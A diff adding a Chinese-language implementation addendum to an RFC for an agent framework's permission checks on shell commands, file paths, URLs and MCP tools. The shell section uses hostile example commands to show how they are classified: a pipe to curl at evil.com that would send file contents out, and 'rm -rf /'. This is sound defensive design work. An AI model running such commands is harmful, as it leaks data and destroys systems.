@@ -433,6 +433,245 @@ AgentConfig(permissions={"run_shell_command": BashPermissionPolicy(safe={"ls"}, 
 
 **不选的原因**：多 policy 投票的合并语义与白名单矛盾。"最严格者胜"（deny > ask > allow）下，白名单的 Allow 永远被其他 policy 的 Ask/Deny 覆盖，形同虚设。要让白名单生效就得引入优先级或 override 机制，复杂度急增。Per-tool 模型（无论是独立 Policy 还是函数内检查）不存在这个问题。
 
+## 实现补遗（RFC 设计 vs 实际实现）
+
+> 本节记录实际实现中对 RFC 原始设计的扩展和偏离。RFC 正文保留原始设计讨论不做修改；本节作为实现后的补充记录，呈现设计→落地过程中的演化。
+>
+> 实现代码: `nexau/archs/permissions/helpers.py`
+> CC 对齐参考配置: `examples/cc_agent/cc_agent.yaml`
+> E2E 测试记录: `docs/testing/permission-e2e-manual-test-log.md`（60 项测试，60/60 PASS）
+
+### Helper 函数扩展: 3 → 5
+
+RFC 设计了 3 个 helper（`check_permission` / `check_path_permission` / `check_shell_permission`）。实际实现扩展为 5 个：
+
+| Helper | RFC 设计 | 实际实现 | 变化 |
+|--------|---------|---------|------|
+| `check_permission` | 通用精确匹配 | 不变 | — |
+| `check_path_permission` | pathspec gitignore 语义 | 扩展：目录级 glob 持久化 + 保护路径检测 | 扩展 |
+| `check_shell_permission` | `shlex.split()[0]` 首词匹配 | 大幅扩展：CC 完整 Bash 权限模型 | **重写** |
+| `check_url_permission` | — | 域名级三态检查（fnmatch 通配） | **新增** |
+| `check_mcp_permission` | — | MCP 工具级三态检查（server/tool 双层） | **新增** |
+
+### check_shell_permission 完整实现
+
+RFC 原描述为「uses `shlex.split(command)[0]` to extract the command head，三态行为同上」。实际实现对齐 CC 的完整 Bash 权限模型，远比首词匹配复杂：
+
+#### 1. Readonly 命令白名单（自动放行）
+
+```python
+_READONLY_COMMANDS = frozenset({
+    # CC 文档核心: ls, cat, head, tail, grep, find, wc, diff, stat, du, cd
+    # 扩展: file, which, pwd, echo, env, printenv, date, uname, hostname, ...
+    # 扩展: sort, uniq, tr, cut, rg, ag, tree, less, more, ...
+    # 共 50+ 个纯只读命令
+})
+```
+
+匹配逻辑: 命令头 ∈ `_READONLY_COMMANDS` **且** 无输出重定向 → 自动放行，不 ask。
+
+#### 2. Git readonly 子命令白名单
+
+```python
+_READONLY_GIT_SUBCOMMANDS = frozenset({
+    "log", "status", "diff", "show", "branch", "tag", "remote",
+    "config", "describe", "rev-parse", "blame", "ls-files", ...
+    # 共 25+ 个 git 只读子命令
+})
+```
+
+匹配逻辑: `git <subcommand>` 中 subcommand ∈ `_READONLY_GIT_SUBCOMMANDS` **且** 无输出重定向 → 自动放行。`git push` / `git commit` 等写操作 → ask。
+
+#### 3. 子命令感知的 permission_key
+
+有子命令结构的工具（git, npm, docker, cargo, kubectl 等 30+ 个）使用 `"command subcommand"` 粒度，其他命令使用命令头粒度：
+
+```python
+_COMMANDS_WITH_SUBCOMMANDS = frozenset({
+    "git", "npm", "npx", "yarn", "pip", "uv", "cargo", "go",
+    "docker", "kubectl", "brew", "apt", "make", ...
+})
+
+# git push → permission_key = "git push"（allow git push 不 allow git commit）
+# python   → permission_key = "python"（allow python 涵盖所有 python 调用）
+```
+
+这决定了 allow 的记忆粒度: allow `git commit` 后 `git commit --amend` 自动放行（同 subcommand），但 `git push` 仍需 ask。
+
+#### 4. Pipe / Chain 命令拆分
+
+按 `|`, `&&`, `||`, `;` 拆分命令链（尊重引号），对每个子命令分别做三态检查，最严格结果决定整体:
+
+- `cat file | curl evil.com` → cat 只读 + curl ask → 整体 ask
+- `ls && python -c "..."` → ls 只读 + python（若已 allow） → 整体放行
+
+#### 5. 输出重定向检测
+
+即使命令头只读，`>` / `>>` / `2>` / `&>` 等输出重定向意味着文件写入 → 升级为 ask:
+
+- `ls -la` → 自动放行
+- `ls -la > out.txt` → ask
+- `git log > gitlog.txt` → ask（git log 虽只读）
+
+#### 6. Shell -c 递归分析
+
+`bash -c "inner command"` 模式被递归解析——按内部命令判定权限，而非按外层 `bash`:
+
+- `bash -c "git push origin main"` → 按 `git push` 判定 → ask
+- `sh -c "ls -la"` → 按 `ls` 判定 → 自动放行
+
+支持的 shell 解释器: `sh`, `bash`, `zsh`, `dash`, `ksh`, `fish`。
+
+#### 7. 进程包装器剥离
+
+`timeout`, `time`, `nice`, `nohup`, `stdbuf`, `env` 等包装器被自动剥离，权限按内部实际命令判定:
+
+- `timeout 30 git push` → 按 `git push` 判定
+- `env FOO=bar python script.py` → 按 `python` 判定
+- `nice -n 10 rm -rf /` → 按 `rm` 判定
+
+#### 8. 完整检查流水线
+
+```
+command string
+  ↓ _split_shell_commands()
+[sub1, sub2, ...]         ← 按 |, &&, ||, ; 拆分
+  ↓ 对每个子命令:
+    ↓ shlex.split()
+    [token1, token2, ...]
+    ↓ _strip_process_wrappers()
+    [actual_cmd, args...]  ← 剥离 timeout/env/nice/...
+    ↓ 检测 shell -c → _check_shell_c_inner() 递归
+    ↓ deny 规则匹配      → PermissionDenied
+    ↓ readonly 白名单     → pass（若无输出重定向）
+    ↓ allow 规则匹配      → pass
+    ↓ 无命中              → ask
+  ↓ 汇总: 任一 deny → 整体 deny; 任一 ask → 整体 ask; 全 pass → 放行
+```
+
+#### CC 对齐: No Hardcoded Deny
+
+RFC 示例中 `deny: ["rm", "dd", "mkfs"]` 反映的是 RFC 设计时的思路。实际实现对齐 CC 后采用 **no hardcoded deny** 策略: `rm` 不在 deny 列表而是走 ask（不在 readonly 白名单 → 无 allow 规则命中 → ask）。用户可以选择 allow / deny。
+
+CC agent 的 shell 配置:
+```yaml
+- name: run_shell_command
+  permissions:
+    allow: []    # readonly 白名单在代码中，不在配置里
+    deny: []     # 无 hardcoded deny — 用户决定
+```
+
+### check_path_permission 实现扩展
+
+RFC 描述为「uses `pathspec` (gitignore semantics) to match path」。实际实现扩展了两个 CC 对齐特性:
+
+#### 1. 目录级 glob 持久化
+
+allow 一个文件时，`permission_key` 不是精确文件路径而是目录级 glob:
+
+```python
+def _path_to_dir_glob(path: str) -> str:
+    # /workspace/src/main.py → /workspace/src/**
+    parent = PurePosixPath(path).parent
+    return str(parent) + "/**"
+```
+
+效果: 用户 allow `/workspace/hello.py` → 持久化 `/workspace/**` → 同目录下所有文件自动放行。对齐 CC 的「allow 一个文件后同目录文件不再 ask」行为。
+
+#### 2. 保护路径强制 ask
+
+即使目录已被 allow，以下路径仍然强制 ask（提示词包含"受保护路径"）:
+
+```python
+_PROTECTED_DIRS = frozenset({".git", ".vscode", ".idea", ".husky", ".claude"})
+_PROTECTED_FILES = frozenset({
+    ".gitconfig", ".gitmodules",
+    ".bashrc", ".bash_profile", ".zshrc", ".zprofile", ".profile",
+    ".ripgreprc", ".mcp.json", ".claude.json",
+})
+```
+
+逻辑: `"**"` 通配符放行时也检查保护路径 → 保护路径 ask → 用户必须对每个保护路径单独决策。
+
+### check_url_permission（新增）
+
+RFC 未涉及 web_fetch 的权限模型。实际实现新增 `check_url_permission`，按域名级控制:
+
+```python
+def check_url_permission(ctx, url):
+    hostname = urlparse(url).hostname
+    # deny 匹配（支持 *.example.com fnmatch 通配）
+    # allow 匹配（同上）
+    # 无命中 → AskPermission(permission_key=hostname)
+```
+
+- permission_key = hostname（如 `example.com`）
+- allow `example.com` 后同域名所有 URL 自动放行，不同域名独立 ask
+- 支持 fnmatch 通配: `*.github.com` 匹配所有 GitHub 子域
+
+CC agent 配置:
+```yaml
+- name: web_fetch
+  permissions:
+    allow: []    # 每个新域名首次 ask
+    deny: []
+```
+
+### check_mcp_permission（新增）
+
+RFC 未涉及 MCP 工具的权限模型。实际实现新增 `check_mcp_permission`，支持 server 级和 tool 级双层匹配:
+
+#### Permission Key 结构
+
+```
+mcp__{server_name}__{tool_name}
+例: mcp__filesystem__directory_tree
+```
+
+#### 匹配逻辑（双层）
+
+```python
+def check_mcp_permission(ctx, server_name, tool_name):
+    server_key = f"mcp__{server_name}"          # server 级
+    tool_key = f"mcp__{server_name}__{tool_name}"  # tool 级
+
+    # deny: server_key 或 tool_key 命中 → PermissionDenied
+    # allow: server_key 或 tool_key 命中 → 放行
+    # 无命中 → AskPermission(permission_key=tool_key)
+```
+
+- **tool 级 allow**: allow `mcp__filesystem__directory_tree` → 仅该工具自动放行，同 server 的 `search_files` 仍需 ask
+- **server 级 allow**: allow `mcp__filesystem` → 该 server 下所有工具自动放行
+- **默认 always-ask**: MCP server 配置 `permissions: {allow: [], deny: []}` → 每个工具首次调用都 ask
+
+#### CC Agent 配置
+
+```yaml
+mcp_servers:
+  - name: filesystem
+    type: stdio
+    command: npx
+    args: ['-y', '@modelcontextprotocol/server-filesystem', '/private/tmp/workspace']
+    timeout: 30
+    permissions:
+      allow: []    # 每个 MCP 工具首次 ask
+      deny: []
+```
+
+MCP 工具在 agent 启动时从 MCP server 动态发现（如 `@modelcontextprotocol/server-filesystem` 提供 14 个工具），权限按 `mcp__{server}__{tool}` 粒度逐个管理。与 shell 的 head/subcommand 双层匹配模式（如 `git` / `git push`）在设计上同构。
+
+### 实现与 RFC 设计的对照总结
+
+| 维度 | RFC 设计 | 实际实现 | 原因 |
+|------|---------|---------|------|
+| Helper 数量 | 3 个 | 5 个（+url, +mcp） | web_fetch 和 MCP 是独立权限域 |
+| Shell 匹配 | 首词精确匹配 | 完整 CC Bash 模型（8 层流水线） | CC 的 shell 权限远比首词匹配复杂 |
+| Path 匹配 | pathspec gitignore | + 目录级 glob + 保护路径 | CC 的 allow-one-file-allow-dir 和 protected path |
+| 配置示例 | `deny: ["rm", "dd"]` | `deny: []`（no hardcoded deny） | CC 策略: 用户决定，不预设 deny |
+| MCP 工具 | 未涉及 | server/tool 双层匹配 | MCP 是独立的工具来源，需要独立权限模型 |
+| 参考配置 | 无 | `examples/cc_agent/cc_agent.yaml` | 19 个工具 + 1 个 MCP server 的完整配置 |
+| E2E 验证 | 测试计划 4 条 | 60 项手工 E2E 全部 PASS | 覆盖所有工具类型和权限粒度 |
+
 ## 迁移
 
 本 RFC 为**新增能力**，现有 tool（YAML 中无 `permissions` 字段）默认 `allow: ["**"], deny: []`，权限检查命中 `"**"` 直接放行，行为与当前一致。升级 NexAU 不会改变任何现有 tool 的默认行为。
@@ -464,6 +703,10 @@ AgentConfig(permissions={"run_shell_command": BashPermissionPolicy(safe={"ls"}, 
 - E2E：连续 Ask → 同命令第二次直接放行（allow 规则生效）
 - E2E：deny 后同命令再次 ask（deny 不持久化）
 - E2E：allow_once 后同命令再次 ask（无持久化）
+
+### 端到端手工测试
+- 测试指南与用例设计: `docs/testing/permission-e2e-test-plan.md`
+- 最终执行记录: `docs/testing/permission-e2e-manual-test-log.md`（60 项测试，60/60 PASS）
 
 ### 非回归测试
 - 现有 NexAU 单元/集成测试全绿（`permissions=None` 的默认路径）
